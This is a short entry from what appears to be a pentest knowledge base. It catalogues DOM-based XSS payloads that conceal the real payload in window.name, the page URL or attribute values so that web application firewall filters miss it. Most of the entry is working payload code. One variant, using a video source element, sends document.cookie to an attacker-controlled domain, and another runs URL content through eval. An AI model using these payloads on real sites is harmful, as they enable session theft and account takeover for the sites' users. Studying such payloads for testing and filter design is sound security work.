---
title: Payload Concealed in URL Fragment / Attributes
slug: payload-in-url-fragment
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/js-string, sink/restricted-chars]
inbound: []
---

# Payload Concealed in URL Fragment / Attributes

## Payload

```html
<svg onload="attributes[0].value=name,new onload">
```

## Variants

```html
<svg onload="attributes[0].value=id+URL+id,new onload" id=`>
<input onfocus="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>
<svg onload=innerHTML=URL,eval(textContent)>
<img/src/onerror=innerHTML=URL,innerHTML=textContent>
<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>
<video><source onerror=location=/\02.rs/+document.cookie>
```

## Context

Hides the actual payload in `window.name`, the page URL (`document.URL`), or element attribute values to avoid WAF pattern matching on the injected string. The `URL` concatenation form reads `document.URL` (the full page URL including fragment) and uses `innerHTML` assignment + `eval(textContent)` to execute the decoded fragment content. The `attributes[0].value=id+URL+id` form with backtick `id` reassembles a string with the URL in the middle. The `onerror=location=/regex/+document.cookie` form sends cookies to an attacker-controlled domain via regex coercion. Sink: event handler attribute in `innerHTML`.

## Provenance

- Distilled from: `../../techniques/dom-xss/restricted-character-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Restricted Character Bypass](../../techniques/dom-xss/restricted-character-bypass.md)
- [WAF Bypass](../../techniques/dom-xss/waf-bypass.md)
